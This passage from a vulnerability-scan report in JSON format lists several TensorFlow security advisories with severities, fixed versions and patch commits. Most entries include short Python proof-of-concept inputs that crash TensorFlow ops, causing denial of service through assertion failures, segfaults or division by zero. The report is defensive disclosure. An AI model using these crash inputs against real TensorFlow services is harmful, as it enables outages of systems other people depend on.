issue](https://github.com/tensorflow/tensorflow/issues/55199).\n"
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "GHSA-mw6j-hh29-h379",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "GHSA-mw6j-hh29-h379"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://github.com/advisories/GHSA-mw6j-hh29-h379",
              "help": {
                "text": "Vulnerability GHSA-mw6j-hh29-h379\nSeverity: medium\nFixed Version: 2.8.1\nLink: [GHSA-mw6j-hh29-h379](https://github.com/advisories/GHSA-mw6j-hh29-h379)\n### Impact\nThe implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) caused by overflowing the number of elements in a tensor:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)\nfilter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)\nout_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)\ntf.raw_ops.DepthwiseConv2dNativeBackpropFilter(\n    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding=\"SAME\")\n```\n  \nThis is another instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).\n  \n### Patches\nWe have patched the issue in GitHub commit [3796cc4fcd93ae55812a457abc96dcd55fbb854b](https://github.com/tensorflow/tensorflow/commit/3796cc4fcd93ae55812a457abc96dcd55fbb854b).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",
                "markdown": "**Vulnerability GHSA-mw6j-hh29-h379**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[GHSA-mw6j-hh29-h379](https://github.com/advisories/GHSA-mw6j-hh29-h379)|\n\n### Impact\nThe implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) caused by overflowing the number of elements in a tensor:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)\nfilter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)\nout_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)\ntf.raw_ops.DepthwiseConv2dNativeBackpropFilter(\n    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding=\"SAME\")\n```\n  \nThis is another instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).\n  \n### Patches\nWe have patched the issue in GitHub commit [3796cc4fcd93ae55812a457abc96dcd55fbb854b](https://github.com/tensorflow/tensorflow/commit/3796cc4fcd93ae55812a457abc96dcd55fbb854b).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29194",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29194"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29194",
              "help": {
                "text": "Vulnerability CVE-2022-29194\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29194](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29194)\n### Impact\nThe implementation of [`tf.raw_ops.DeleteSessionTensor`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/session_ops.cc#L128-L144) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nhandle = tf.constant(\"[]\", shape=[0], dtype=tf.string)\ntf.raw_ops.DeleteSessionTensor(handle=handle)\n```\n  \nThe code assumes `handle` is a scalar but there is no validation for this:\n  \n```cc\n    const Tensor\u0026 handle = ctx-\u003einput(0);\n    const string\u0026 name = handle.scalar\u003ctstring\u003e()();\n```\n\n### Patches\nWe have patched the issue in GitHub commit [cff267650c6a1b266e4b4500f69fbc49cdd773c5](https://github.com/tensorflow/tensorflow/commit/cff267650c6a1b266e4b4500f69fbc49cdd773c5).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",
                "markdown": "**Vulnerability CVE-2022-29194**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29194](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29194)|\n\n### Impact\nThe implementation of [`tf.raw_ops.DeleteSessionTensor`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/session_ops.cc#L128-L144) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nhandle = tf.constant(\"[]\", shape=[0], dtype=tf.string)\ntf.raw_ops.DeleteSessionTensor(handle=handle)\n```\n  \nThe code assumes `handle` is a scalar but there is no validation for this:\n  \n```cc\n    const Tensor\u0026 handle = ctx-\u003einput(0);\n    const string\u0026 name = handle.scalar\u003ctstring\u003e()();\n```\n\n### Patches\nWe have patched the issue in GitHub commit [cff267650c6a1b266e4b4500f69fbc49cdd773c5](https://github.com/tensorflow/tensorflow/commit/cff267650c6a1b266e4b4500f69fbc49cdd773c5).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29192",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29192"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29192",
              "help": {
                "text": "Vulnerability CVE-2022-29192\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29192](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29192)\n### Impact\nThe implementation of [`tf.raw_ops.QuantizeAndDequantizeV4Grad`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L148-L226) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeAndDequantizeV4Grad(\n  gradients=tf.constant(1, shape=[2,2], dtype=tf.float64),\n  input=tf.constant(1, shape=[2,2], dtype=tf.float64),\n  input_min=tf.constant([], shape=[0], dtype=tf.float64),\n  input_max=tf.constant(-10, shape=[], dtype=tf.float64),\n  axis=-1)\n```\n\nThe code assumes `input_min` and `input_max` are scalars but there is no validation for this.\n\n### Patches\nWe have patched the issue in GitHub commit [098e7762d909bac47ce1dbabe6dfd06294cb9d58](https://github.com/tensorflow/tensorflow/commit/098e7762d909bac47ce1dbabe6dfd06294cb9d58).\n    \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",
                "markdown": "**Vulnerability CVE-2022-29192**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29192](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29192)|\n\n### Impact\nThe implementation of [`tf.raw_ops.QuantizeAndDequantizeV4Grad`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L148-L226) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeAndDequantizeV4Grad(\n  gradients=tf.constant(1, shape=[2,2], dtype=tf.float64),\n  input=tf.constant(1, shape=[2,2], dtype=tf.float64),\n  input_min=tf.constant([], shape=[0], dtype=tf.float64),\n  input_max=tf.constant(-10, shape=[], dtype=tf.float64),\n  axis=-1)\n```\n\nThe code assumes `input_min` and `input_max` are scalars but there is no validation for this.\n\n### Patches\nWe have patched the issue in GitHub commit [098e7762d909bac47ce1dbabe6dfd06294cb9d58](https://github.com/tensorflow/tensorflow/commit/098e7762d909bac47ce1dbabe6dfd06294cb9d58).\n    \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29211",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29211"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29211",
              "help": {
                "text": "Vulnerability CVE-2022-29211\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29211](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29211)\n### Impact\nThe implementation of [`tf.histogram_fixed_width`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/histogram_op.cc) is vulnerable to a crash when the values array contain `NaN` elements:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.histogram_fixed_width(values=np.nan, value_range=[1,2])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/histogram_op.cc#L35-L74) assumes that all floating point operations are defined and then converts a floating point result to an integer index:\n\n```cc\nindex_to_bin.device(d) =\n    ((values.cwiseMax(value_range(0)) - values.constant(value_range(0)))\n         .template cast\u003cdouble\u003e() /\n     step)\n        .cwiseMin(nbins_minus_1)\n        .template cast\u003cint32\u003e();\n```\n\nIf `values` contains `NaN` then the result of the division is still `NaN` and the cast to `int32` would result in a crash.\n\nThis only occurs on the CPU implementation.\n\n### Patches\nWe have patched the issue in GitHub commit [e57fd691c7b0fd00ea3bfe43444f30c1969748b5](https://github.com/tensorflow/tensorflow/commit/e57fd691c7b0fd00ea3bfe43444f30c1969748b5).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/45770).",
                "markdown": "**Vulnerability CVE-2022-29211**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29211](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29211)|\n\n### Impact\nThe implementation of [`tf.histogram_fixed_width`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/histogram_op.cc) is vulnerable to a crash when the values array contain `NaN` elements:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.histogram_fixed_width(values=np.nan, value_range=[1,2])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/histogram_op.cc#L35-L74) assumes that all floating point operations are defined and then converts a floating point result to an integer index:\n\n```cc\nindex_to_bin.device(d) =\n    ((values.cwiseMax(value_range(0)) - values.constant(value_range(0)))\n         .template cast\u003cdouble\u003e() /\n     step)\n        .cwiseMin(nbins_minus_1)\n        .template cast\u003cint32\u003e();\n```\n\nIf `values` contains `NaN` then the result of the division is still `NaN` and the cast to `int32` would result in a crash.\n\nThis only occurs on the CPU implementation.\n\n### Patches\nWe have patched the issue in GitHub commit [e57fd691c7b0fd00ea3bfe43444f30c1969748b5](https://github.com/tensorflow/tensorflow/commit/e57fd691c7b0fd00ea3bfe43444f30c1969748b5).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/45770)."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29208",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29208"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29208",
              "help": {
                "text": "Vulnerability CVE-2022-29208\nSeverity: high\nFixed Version: 2.8.1\nLink: [CVE-2022-29208](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29208)\n### Impact\nThe implementation of [`tf.raw_ops.EditDistance`]() has incomplete validation. Users can pass negative values to cause a segmentation fault based denial of service:\n\n```python\nimport tensorflow as tf\n\nhypothesis_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64) \nhypothesis_values = tf.constant(0, shape=[3], dtype=tf.int64)\nhypothesis_shape = tf.constant(0, shape=[3], dtype=tf.int64)\n\ntruth_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64)\ntruth_values = tf.constant(2, shape=[3], dtype=tf.int64)\ntruth_shape = tf.constant(2, shape=[3], dtype=tf.int64) \n\ntf.raw_ops.EditDistance(\n  hypothesis_indices=hypothesis_indices,\n  hypothesis_values=hypothesis_values,\n  hypothesis_shape=hypothesis_shape,\n  truth_indices=truth_indices,\n  truth_values=truth_values,\n  truth_shape=truth_shape)\n```\n\nIn multiple places throughout the code, we are computing an index for a write operation:\n\n```cc\nif (g_truth == g_hypothesis) {\n  auto loc = std::inner_product(g_truth.begin(), g_truth.end(),\n                                output_strides.begin(), int64_t{0});\n  OP_REQUIRES(\n      ctx, loc \u003c output_elements,\n      errors::Internal(\"Got an inner product \", loc,\n                       \" which would require in writing to outside of \"\n                       \"the buffer for the output tensor (max elements \",\n                       output_elements, \")\"));\n  output_t(loc) =\n      gtl::LevenshteinDistance\u003cT\u003e(truth_seq, hypothesis_seq, cmp);\n  // ...\n}\n```\n\nHowever, the existing validation only checks against the upper bound of the array. Hence, it is possible to write before the array by massaging the input to generate negative values for `loc`.\n\n### Patches\nWe have patched the issue in GitHub commit [30721cf564cb029d34535446d6a5a6357bebc8e7](https://github.com/tensorflow/tensorflow/commit/30721cf564cb029d34535446d6a5a6357bebc8e7).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",
                "markdown": "**Vulnerability CVE-2022-29208**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.8.1|[CVE-2022-29208](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29208)|\n\n### Impact\nThe implementation of [`tf.raw_ops.EditDistance`]() has incomplete validation. Users can pass negative values to cause a segmentation fault based denial of service:\n\n```python\nimport tensorflow as tf\n\nhypothesis_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64) \nhypothesis_values = tf.constant(0, shape=[3], dtype=tf.int64)\nhypothesis_shape = tf.constant(0, shape=[3], dtype=tf.int64)\n\ntruth_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64)\ntruth_values = tf.constant(2, shape=[3], dtype=tf.int64)\ntruth_shape = tf.constant(2, shape=[3], dtype=tf.int64) \n\ntf.raw_ops.EditDistance(\n  hypothesis_indices=hypothesis_indices,\n  hypothesis_values=hypothesis_values,\n  hypothesis_shape=hypothesis_shape,\n  truth_indices=truth_indices,\n  truth_values=truth_values,\n  truth_shape=truth_shape)\n```\n\nIn multiple places throughout the code, we are computing an index for a write operation:\n\n```cc\nif (g_truth == g_hypothesis) {\n  auto loc = std::inner_product(g_truth.begin(), g_truth.end(),\n                                output_strides.begin(), int64_t{0});\n  OP_REQUIRES(\n      ctx, loc \u003c output_elements,\n      errors::Internal(\"Got an inner product \", loc,\n                       \" which would require in writing to outside of \"\n                       \"the buffer for the output tensor (max elements \",\n                       output_elements, \")\"));\n  output_t(loc) =\n      gtl::LevenshteinDistance\u003cT\u003e(truth_seq, hypothesis_seq, cmp);\n  // ...\n}\n```\n\nHowever, the existing validation only checks against the upper bound of the array. Hence, it is possible to write before the array by massaging the input to generate negative values for `loc`.\n\n### Patches\nWe have patched the issue in GitHub commit [30721cf564cb029d34535446d6a5a6357bebc8e7](https://github.com/tensorflow/tensorflow/commit/30721cf564cb029d34535446d6a5a6357bebc8e7).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-29201",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29201"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29201",
              "help": {
                "text": "Vulnerability CVE-2022-29201\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29201](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29201)\n### Impact\nThe implementation of [`tf.raw_ops.QuantizedConv2D`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/quantized_conv_ops.cc) does not fully validate the input arguments:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant(1, shape=[1, 2, 3, 3], dtype=tf.quint8)\nfilter = tf.constant(1, shape=[1, 2, 3, 3], dtype=tf.quint8)\n\n# bad args\nmin_input = tf.constant([], shape=[0], dtype=tf.float32)\nmax_input = tf.constant(0, shape=[], dtype=tf.float32)\nmin_filter = tf.constant(0, shape=[], dtype=tf.float32)\nmax_filter = tf.constant(0, shape=[], dtype=tf.float32)\n\ntf.raw_ops.QuantizedConv2D(\n  input=input,\n  filter=filter,\n  min_input=min_input,\n  max_input=max_input,\n  min_filter=min_filter,\n  max_filter=max_filter, \n  strides=[1, 1, 1, 1],\n  padding=\"SAME\")\n```\n\nIn this case, references get bound to `nullptr` for each argument that is empty (in the example, all arguments in the `bad args` section).\n\n### Patches\nWe have patched the issue in GitHub commit [0f0b080ecde4d3dfec158d6f60da34d5e31693c4](https://github.com/tensorflow/tensorflow/commit/0f0b080ecde4d3dfec158d6f60da34d5e31693c4).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-29201**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29201](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29201)|\n\n### Impact\nThe implementation of [`tf.raw_ops.QuantizedConv2D`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/quantized_conv_ops.cc) does not fully validate the input arguments:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant(1, shape=[1, 2, 3, 3], dtype=tf.quint8)\nfilter = tf.constant(1, shape=[1, 2, 3, 3], dtype=tf.quint8)\n\n# bad args\nmin_input = tf.constant([], shape=[0], dtype=tf.float32)\nmax_input = tf.constant(0, shape=[], dtype=tf.float32)\nmin_filter = tf.constant(0, shape=[], dtype=tf.float32)\nmax_filter = tf.constant(0, shape=[], dtype=tf.float32)\n\ntf.raw_ops.QuantizedConv2D(\n  input=input,\n  filter=filter,\n  min_input=min_input,\n  max_input=max_input,\n  min_filter=min_filter,\n  max_filter=max_filter, \n  strides=[1, 1, 1, 1],\n  padding=\"SAME\")\n```\n\nIn this case, references get bound to `nullptr` for each argument that is empty (in the example, all arguments in the `bad args` section).\n\n### Patches\nWe have patched the issue in GitHub commit [0f0b080ecde4d3dfec158d6f60da34d5e31693c4](https://github.com/tensorflow/tensorflow/commit/0f0b080ecde4d3dfec158d6f60da34d5e31693c4).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.\n"
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-23590",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23590"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23590",
              "help": {
                "text": "Vulnerability CVE-2022-23590\nSeverity: medium\nFixed Version: 2.7.1\nLink: [CVE-2022-23590](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23590)\n### Impact\nA `GraphDef` from a TensorFlow `SavedModel` can be maliciously altered to cause a TensorFlow process to crash due to encountering [a `StatusOr` value that is an error and forcibly extracting the value from it](https://github.com/tensorflow/tensorflow/blob/274df9b02330b790aa8de1cee164b70f72b9b244/tensorflow/core/graph/graph.cc#L560-L567):\n\n```cc\n  if (op_reg_data-\u003etype_ctor != nullptr) {\n    VLOG(3) \u003c\u003c \"AddNode: found type constructor for \" \u003c\u003c node_def.name();\n    const auto ctor_type =\n        full_type::SpecializeType(AttrSlice(node_def), op_reg_data-\u003eop_def);\n    const FullTypeDef ctor_typedef = ctor_type.ValueOrDie();\n    if (ctor_typedef.type_id() != TFT_UNSET) {\n      *(node_def.mutable_experimental_type()) = ctor_typedef;\n    }\n  }\n```   \n      \nIf `ctor_type` is an error status, `ValueOrDie` results in a crash.\n        \n### Patches\nWe have patched the issue in GitHub commit [955059813cc325dc1db5e2daa6221271406d4439](https://github.com/tensorflow/tensorflow/commit/955059813cc325dc1db5e2daa6221271406d4439).\n  \nWe have patched the issue in multiple GitHub commits and these will be included in TensorFlow 2.8.0 and TensorFlow 2.7.1, as both are affected.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23590**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.1|[CVE-2022-23590](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23590)|\n\n### Impact\nA `GraphDef` from a TensorFlow `SavedModel` can be maliciously altered to cause a TensorFlow process to crash due to encountering [a `StatusOr` value that is an error and forcibly extracting the value from it](https://github.com/tensorflow/tensorflow/blob/274df9b02330b790aa8de1cee164b70f72b9b244/tensorflow/core/graph/graph.cc#L560-L567):\n\n```cc\n  if (op_reg_data-\u003etype_ctor != nullptr) {\n    VLOG(3) \u003c\u003c \"AddNode: found type constructor for \" \u003c\u003c node_def.name();\n    const auto ctor_type =\n        full_type::SpecializeType(AttrSlice(node_def), op_reg_data-\u003eop_def);\n    const FullTypeDef ctor_typedef = ctor_type.ValueOrDie();\n    if (ctor_typedef.type_id() != TFT_UNSET) {\n      *(node_def.mutable_experimental_type()) = ctor_typedef;\n    }\n  }\n```   \n      \nIf `ctor_type` is an error status, `ValueOrDie` results in a crash.\n        \n### Patches\nWe have patched the issue in GitHub commit [955059813cc325dc1db5e2daa6221271406d4439](https://github.com/tensorflow/tensorflow/commit/955059813cc325dc1db5e2daa6221271406d4439).\n  \nWe have patched the issue in multiple GitHub commits and these will be included in TensorFlow 2.8.0 and TensorFlow 2.7.1, as both are affected.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35996",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35996"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35996",
              "help": {
                "text": "Vulnerability CVE-2022-35996\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35996](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35996)\n### Impact\nIf `Conv2D` is given empty `input` and the `filter` and `padding` sizes are valid, the output is all-zeros. This causes division-by-zero floating point exceptions that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np\nwith tf.device(\"CPU\"): # also can be triggerred on GPU\n   input = np.ones([1, 0, 2, 1])\n   filter = np.ones([1, 1, 1, 1])\n   strides = ([1, 1, 1, 1])\n   padding = \"EXPLICIT\"\n   explicit_paddings = [0 , 0, 1, 1, 1, 1, 0, 0]\n   data_format = \"NHWC\"\n   res = tf.raw_ops.Conv2D(\n       input=input,\n       filter=filter,\n       strides=strides,\n       padding=padding,\n        explicit_paddings=explicit_paddings,\n       data_format=data_format,\n  )\n```\n\n### Patches\nWe have patched the issue in GitHub commit [611d80db29dd7b0cfb755772c69d60ae5bca05f9](https://github.com/tensorflow/tensorflow/commit/611d80db29dd7b0cfb755772c69d60ae5bca05f9).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jingyi Shi.\n",
